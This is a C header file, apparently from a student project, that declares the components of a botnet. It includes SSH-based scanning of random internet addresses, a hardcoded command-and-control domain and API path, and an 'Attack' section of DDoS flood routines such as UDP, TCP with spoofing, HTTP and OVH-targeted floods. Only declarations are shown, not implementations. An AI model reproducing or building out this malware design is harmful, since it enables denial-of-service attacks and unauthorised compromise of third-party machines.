/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   px_ssh.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: tnard <tnard@student.42lyon.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/03/24 12:30:18 by tnard             #+#    #+#             */
/*   Updated: 2022/03/24 12:30:18 by tnard            ###   ########lyon.fr   */
/*                                                                            */
/* ************************************************************************** */

#ifndef PX_SSH_H
# define PX_SSH_H

# include <libssh/libssh.h> // to remove if can't cross compile
# include <stdlib.h>
# include <stdio.h> 
# include <string.h>
# include <unistd.h>
# include <fcntl.h>
# include <time.h>
# include <pthread.h>
# include <sys/time.h>
# include <unistd.h>
# include <string.h>
# include "http.h"


#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#define STD2_SIZE 1024

# define true 1
# define false 0

# define DEBUG 1

# include "../libft/libft.h"

# define url "gdjgufsdhugfsadyuihfyuisdghf.pandeo.fr"
# define url_page "/api.php"

char	*ft_strnjoin(char *s1, char *s2, int n);
char	*ft_strnjoinf(char *s1, char *s2, int n);
char	*ft_get_id(void);
void	ft_scan_world(pthread_t thread);
void	ft_put_ip(char *ip, int tmp, int i);
void	ft_generate_ip(char *ip);
void	ft_free_split(char **split);
char	*ft_request(char *post);
int		ft_split_len(char **split);

// Protocol
// 			General
int				socket_connect(char *host, in_port_t port);
uint32_t		rand_cmwc(void);
in_addr_t		getRandomIP(in_addr_t netmask);
int				getHost(unsigned char *toGet, struct in_addr *i);
unsigned short	csum(unsigned short *buf, int count);
unsigned short	tcpcsum(struct iphdr *iph, struct tcphdr *tcph);
void			makeRandomStr(unsigned char *buf, int length);
void			makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize);

// 			Attack
void	OVHL7(char *host, in_port_t port, int timeEnd, int power);
void	UDPRAW(unsigned char *ip, int port, int secs);
void	XTDCUSTOM(unsigned char *ip, int port, int secs);
void	UNKNOWN(unsigned char *ip, int port, int secs);
void	UDPRAW(unsigned char *ip, int port, int secs);
void	TCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int packetsize, int pollinterval, int spoofit);
void	STD(unsigned char *ip, int port, int secs);
void	RANDHEX(unsigned char *ip, int port, int secs);
void	OVHL7(char *host, in_port_t port, int timeEnd, int power);
void	JUNK(unsigned char *ip, int port, int end_time);
void	HTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power);
void	CNC(unsigned char *ip, int port, int end_time);
void	HOLD(unsigned char *ip, int port, int end_time);
#endif